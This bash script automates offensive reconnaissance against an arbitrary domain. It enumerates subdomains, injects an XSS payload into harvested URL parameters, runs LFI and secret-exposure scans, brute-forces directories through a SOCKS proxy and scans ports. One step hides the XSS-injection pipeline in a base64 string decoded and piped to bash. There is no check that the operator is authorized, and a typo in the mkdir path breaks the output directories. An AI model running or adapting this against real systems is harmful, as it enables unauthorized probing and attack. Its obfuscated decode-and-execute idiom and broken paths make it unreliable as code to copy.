#!/bin/bash

domain="$1"
proxy="socks5://127.0.0.1:1337"

mkdir -p /root/reseults/$domain/{httpx_info,subdomains,fuzzing,vulns,ports,wayback_data,aquatone}

alive_subdomains_path="/root/results/$domain/httpx_info/alive_subdomains.txt"
wayback_data_path="/root/results/$domain/wayback_data"
vulns_path="/root/results/$domain/vulns"
param_spider_path="/root/Paramspider/domains"
wordlist_dir="/root/tools/ElKraken/Tools/custom_wordlist.txt"

echo "Listing subdomains on $domain" | notify -bulk -silent
python3 /root/tools/SubList3r/sublist3r.py -d $domain -o /root/results/$domain/subdomains/subdomains.txt
subfinder -d $domain -all -silent | anew /root/results/$domain/subdomains/subdomains.txt
chaos -d $domain -silent | grep "\.$domain$" | sed 's/*.//' | anew /root/results/$domain/subdomains/subdomains.txt
assetfinder --subs-only $domain | grep "\.$domain$" | sed 's/*.//' | anew /root/results/$domain/subdomains/subdomains.txt
amass -passive -d $domain -noalts -norecursive | anew /root/results/$domain/subdomains/subdomains.txt
echo "Total passive subdomains found on $domain -> $(wc -l < /root/results/$domain/subdomains/subdomains.txt)" | notify -bulk -silent

# Bruteforce
echo "Bruteforce with puredns on $domain" | notify -bulk -silent
puredns bruteforce -r /root/tools/ElKraken/Tools/resolvers.txt /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt $domain --write puredns.txt
cat puredns.txt | anew /root/results/$domain/subdomains/subdomains.txt
echo "Total subdomains after run puredns on $domain -> $(wc -l < /root/results/$domain/subdomains/subdomains.txt)" | notify -bulk -silent

# Alive subdomains
echo "Running httpx on $domain" | notify -bulk -silent
httpx -l /root/results/$domain/subdomains/subdomains.txt -silent | tee -a /root/results/$domain/httpx_info/alive_subdomains.txt
echo -e "Alive subdomains $(wc -l < $alive_subdomains_path)" | notify -bulk -silent

# Wayback Data
echo "Wayback Data on $domain" | notify -bulk -silent
cat $alive_subdomains_path | gau --threads 16 --subs --blacklist jpg,png,woff,woff2,ico,svg,gif,jpeg | tee -a $wayback_data_path/gau.txt
cat $alive_subdomains_path | waybackurls | tee -a $wayback_data_path/waybackurls.txt
waymore -i $domain -mode U -oU $wayback_data_path/waymore.txt
cat $alive_subdomains_path | katana -jc -d 5 -silent | tee -a $wayback_data_path/katana.txt
paramspider -l $alive_subdomains_path

# XSS
echo "Running kxss on $domain" | notify -bulk -silent
cat $wayback_data_path/*.txt | gf xss | uro | kxss | grep -v "\[\]" | tee -a $vulns_path/XSS.txt
cat $param_spider_path/*.txt | kxss | grep -v "\[\]" | anew $vulns_path/XSS.txt
echo "Kxss has finished -> $(cat $vulns_path/XSS.txt | grep '<' | wc -l) posible XSS" | notify -bulk -silent

# XSS (Freq)
echo "Running freq on $domain" | notify -bulk -silent
#cat $wayback_data_path/*.txt $param_spider_path/*.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew $vulns_path/freq.txt | notify -bulk -silent
proxychains4 -q bash -c "echo Y2F0ICR3YXliYWNrX2RhdGFfcGF0aC8qLnR4dCAkcGFyYW1fc3BpZGVyX3BhdGgvKi50eHQgfCBncmVwICI9IiB8IGVncmVwIC1pdiAiLihqcGd8anBlZ3xnaWZ8Y3NzfHRpZnx0aWZmfHBuZ3x0dGZ8d29mZnx3b2ZmMnxpY29ufHBkZnxzdmd8dHh0fGpzKSIgfCB1cm8gfCBxc3JlcGxhY2UgJyI+PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpOz4nIHwgZnJlcSB8IGVncmVwIC12ICdOb3QnIHwgYW5ldyAkdnVsbnNfcGF0aC9mcmVxLnR4dCB8IG5vdGlmeSAtYnVsayAtc2lsZW50Cg== | base64 -d | bash"
echo "Freq has finished on $domain"

# Secrets
echo -e "Runnig nuclei for list secrets on $domain" | notify -bulk -silent
cat $wayback_data_path/*.txt | grep "\.js$" | httpx -silent | tee -a $wayback_data_path/js.txt
nuclei -l $wayback_data_path/js.txt -rl 40 -c 20 -t exposures -o $vulns_path/secrets.txt
echo "Nuclei secrets has finished on $domain -> $(wc -l < $vulns_path/secrets.txt)" | notify -bulk -silent

# Fast lfi test
echo "Listing LFI on $domain with nuclei" | notify -bulk -silent
cat $wayback_data_path/*.txt $param_spider_path/*.txt | gf lfi | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | nuclei -tags lfi -rl 40 -c 20 -p $proxy -o $vulns_path/LFI.txt
echo "Nuclei LFI has finished on $domain -> $(wc -l < $vulns_path/LFI.txt) results" | notify -bulk -silent

# Fuzzing
echo "Running dirsearch on $domain" | notify -bulk -silent
dirsearch -w $wordlist_dir -exclude 404,403,401,400 -l $alive_subdomains_path --proxy $proxy --crawl -o /root/results/$domain/fuzzing/dirsearch.txt
echo "Dirsearch has finished on $domain" | notify -bulk -silent

# Port scan
echo "Scanning ports on $domain" | notify -bulk -silent
cat $alive_subdomains_path | dnsx -a -ro | naabu -top-ports 1000 -exclude-ports 80,443,21,22,25 -o /root/results/$domain/ports/naabu_ports.txt
echo "Naabu has finished on $domain -> $(wc -l < /root/results/$domain/ports/naabu_ports.txt)" | notify -bulk -silent

# Screeshots
echo "Taking screeshots on $domain" | notify -bulk -silent
cat $alive_subdomains_path | aquatone -chrome-path /snap/bin/chromium -o /root/results/$domain/aquatone
echo "Aquatone has finished on $domain" | notify -bulk -silent
